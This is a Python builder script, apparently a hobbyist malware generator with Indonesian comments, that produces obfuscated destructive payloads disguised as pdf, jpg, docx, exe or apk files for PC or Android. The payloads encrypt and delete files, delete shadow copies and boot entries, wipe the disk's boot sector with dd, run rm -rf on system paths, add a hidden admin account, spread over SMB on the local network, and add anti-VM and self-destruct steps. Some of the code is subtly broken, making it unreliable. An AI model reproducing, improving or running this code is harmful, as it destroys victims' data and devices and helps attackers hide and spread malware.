import os
import base64
import random
import time
import shutil
from glob import glob
import sys
from itertools import cycle
from time import sleep

# Daftar payload ransomware
payloads = {
    1: "CryptoWiper Apocalypse",
    2: "Data Leech Extortionist",
    3: "System Saboteur",
    4: "Network Plague Spreader",
    5: "PsychoTerror Display"
}

# Daftar format file penyamaran
file_formats = ["pdf", "jpg", "docx", "mp4", "txt", "exe", "apk"]

# Animasi Hollywood
def hollywood_intro():
    print("\033[1;32m")  # Hijau neon
    ascii_art = """
    ╔════════════════════════════════════════════╗
    ║     SINISTER CHAOS: MR.4REX_503 v1.0       ║
    ║   Unleash the Abyss. Burn the System Down. ║
    ╚════════════════════════════════════════════╝
    """
    for char in ascii_art:
        print(char, end='', flush=True)
        sleep(0.01)
    print("\033[0m")
    print("\033[1;31m[ALERT] You’ve entered the dark grid. Choose your weapon...\033[0m\n")

def loading_animation():
    spinner = cycle(['-', '/', '|', '\\'])
    for _ in range(20):
        sys.stdout.write(f"\r\033[1;32m[INFECTING SYSTEM] {next(spinner)}")
        sys.stdout.flush()
        sleep(0.1)
    print("\r\033[1;32m[INFECTED] Payload armed and ready.\033[0m")

def obfuscate_code(code):
    # Obfuscation tingkat Hollywood: base64 + XOR + polimorfik
    encoded = base64.b64encode(code.encode()).decode()
    xor_key = random.randint(1, 255)
    xor_obfuscated = ''.join(chr(ord(c) ^ xor_key) for c in encoded)
    return f"""
import random
random.seed({random.randint(1, 1000)})
exec(base64.b64decode(''.join(chr(ord(c) ^ {xor_key}) for c in '{xor_obfuscated}')).decode())
"""

def generate_payload(payload_id, target, file_format):
    if target == "PC" and file_format == "apk":
        print("\033[1;31m[ERROR] .apk is Android-only, script kiddie!\033[0m")
        return
    if target == "Android" and file_format == "exe":
        print("\033[1;31m[ERROR] .exe is PC-only, try harder!\033[0m")
        return

    # Payload 1: CryptoWiper Apocalypse
    if payload_id == 1:
        base_payload = """
import os
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
def crypto_wiper():
    key = os.urandom(32)
    for root, _, files in os.walk('{}'):
        for file in files:
            try:
                with open(os.path.join(root, file), 'rb') as f:
                    data = f.read()
                iv = os.urandom(16)
                cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
                encrypted = cipher.encryptor().update(data) + cipher.encryptor().finalize()
                with open(os.path.join(root, file), 'wb') as f:
                    f.write(iv + encrypted)
                os.remove(os.path.join(root, file))  # Hapus asli
            except:
                pass
    if '{}' == 'PC':
        os.system('vssadmin delete shadows /all /quiet; bcdedit /delete {{current}}')
    else:
        os.system('rm -rf /data/*; pm clear com.android.systemui')
    # Rootkit persistence
    if '{}' == 'PC':
        os.system('echo "malware" > /Windows/System32/drivers/etc/rootkit.sys')
    else:
        os.system('cp ' + __file__ + ' /data/local/tmp/.hidden')
crypto_wiper()
""".format("/" if target == "PC" else "/sdcard", target, target)

    # Payload 2: Data Leech Extortionist
    elif payload_id == 2:
        base_payload = """
import os
from glob import glob
def data_leech():
    sensitive_extensions = ['*.pdf', '*.docx', '*.xlsx', '*.jpg', '*.db']
    for ext in sensitive_extensions:
        for file in glob('{}' + f'/**/{ext}',recursive=True):
            try:
                with open(file, 'rb') as f:
                    data = f.read()  # Simulasi pencurian
                os.remove(file)  # Hapus file
            except:
                pass
    # Backdoor untuk serangan lanjutan
    if '{}' == 'PC':
        os.system('net user /add hiddenadmin$ pass123')
    else:
        os.system('echo "backdoor" > /data/local/tmp/.backdoor')
data_leech()
""".format("/" if target == "PC" else "/sdcard", target)

    # Payload 3: System Saboteur
    elif payload_id == 3:
        base_payload = """
import os
def sabotage():
    if '{}' == 'PC':
        os.system('dd if=/dev/zero of=/dev/sda bs=512 count=1')
        os.system('echo 100 > /sys/class/thermal/thermal_zone0/trip_point_0_temp')  # Overheat
    else:
        os.system('rm -rf /system/*; reboot -f')  # Bootloop
sabotage()
""".format(target)

    # Payload 4: Network Plague Spreader
    elif payload_id == 4:
        base_payload = """
import socket
import os
def network_plague():
    for i in range(1, 255):
        ip = f'192.168.1.{i}'
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((ip, 445))
            s.close()
            os.system('cp ' + __file__ + f' //{ip}/share/malware.{file_format}')
        except:
            pass
    os.system('rm -rf {}')
network_plague()
""".format("/" if target == "PC" else "/sdcard")

    # Payload 5: PsychoTerror Display
    elif payload_id == 5:
        base_payload = """
import os
def terrorize():
    if '{}' == 'PC':
        os.system('start terrifying_image.jpg')
        os.system('powershell -c "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show(\\"YOUR DEVICE IS DOOMED\\", \\"CHAOS\\", \\"OK\\", \\"Error\\")"')
    else:
        os.system('am start -a android.intent.action.VIEW -d file:///sdcard/terrifying.mp4')
        os.system('settings put system screen_brightness 1000')  # Maksimal kecerahan
    while True:
        pass  # Lock perangkat
terrorize()
""".format(target)

    # Tambahkan self-destruct dan anti-VM
    base_payload += """
import os
def anti_vm():
    vm_indicators = ['vmware', 'virtualbox', 'qemu']
    for proc in os.listdir('/proc'):
        if any(ind in proc.lower() for ind in vm_indicators):
            exit()
def self_destruct():
    try:
        shutil.rmtree(os.path.dirname(__file__))
    except:
        pass
anti_vm()
self_destruct()
"""

    # Obfuscate payload
    obfuscated_payload = obfuscate_code(base_payload)

    # Simpan payload dalam format file penyamaran
    output_file = f"dark_payload.{file_format}"
    with open(output_file, 'w') as f:
        if file_format in ['exe', 'apk']:
            f.write(f"#!/usr/bin/env python3\n{obfuscated_payload}")
        else:
            f.write(obfuscated_payload)
    os.chmod(output_file, 0o755)
    loading_animation()
    print(f"\033[1;32m[DONE] Payload '{payloads[payload_id]}' for {target} forged as 'dark_payload.{file_format}'")
    print("\033[1;31m[CHAOS] Deploy this weapon and watch the world burn!\033[0m")

def main():
    hollywood_intro()
    while True:
        print("\n\033[1;36m=== CYBERFORGE: CHOOSE YOUR WEAPON ===\033[0m")
        for key, value in payloads.items():
            print(f"\033[1;32m{key}. {value}\033[0m")
        print("\033[1;31m0. Exit the Abyss\033[0m")
        
        choice = input("\033[1;36m> Enter your choice (1-5) or 0 to vanish: \033[0m")
        if choice == "0":
            print("\033[1;31m[EXIT] Disappearing into the dark grid...\033[0m")
            break
        if choice not in ["1", "2", "3", "4", "5"]:
            print("\033[1;31m[ERROR] Invalid choice, hacker. Try again.\033[0m")
            continue
        
        payload_id = int(choice)
        target = input("\033[1;36m> Target system (PC/Android): \033[0m").capitalize()
        if target not in ["PC", "Android"]:
            print("\033[1;31m[ERROR] Target must be PC or Android, rookie!\033[0m")
            continue
        
        print("\n\033[1;36m> Select disguise format:\033[0m")
        for i, fmt in enumerate(file_formats, 1):
            print(f"\033[1;32m{i}. {fmt}\033[0m")
        fmt_choice = input("\033[1;36m> Choose format (1-7): \033[0m")
        if fmt_choice not in ["1", "2", "3", "4", "5", "6", "7"]:
            print("\033[1;31m[ERROR] Invalid format, try again!\033[0m")
            continue
        
        file_format = file_formats[int(fmt_choice) - 1]
        print(f"\n\033[1;36m> Forging {payloads[payload_id]} for {target} as .{file_format}...\033[0m")
        generate_payload(payload_id, target, file_format)

if __name__ == "__main__":
    main()
